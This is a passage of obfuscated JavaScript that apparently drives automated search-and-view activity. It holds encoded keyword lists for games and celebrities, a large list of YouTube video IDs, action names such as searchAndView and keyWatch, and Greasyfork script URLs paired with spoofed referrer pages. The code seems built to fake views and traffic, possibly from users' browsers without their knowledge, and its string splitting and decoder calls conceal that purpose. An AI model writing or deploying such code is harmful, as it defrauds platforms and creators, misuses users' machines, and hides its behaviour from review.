searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + Z(0x1e) + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + Z(0x1b) + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + a0(0x19) + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xfd2 + 0x9c9 + -0x1991)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x2db + -0x1 * -0x1e74 + -0x1b8f)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x8 * 0x2b7 + -0x29 * 0xa6 + 0x4e1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    a1(0x1f, '8f4E') + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    Z(0x11) + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    a1(0x1a, '0]Kq') + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    Z(0x22) + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    a1(0x2, '@1rB') + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + Z(0x5) + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + a1(0x7, 'fNWf') + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x1d) + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + a1(0x9, '#vOP') + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': a0(0xe) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
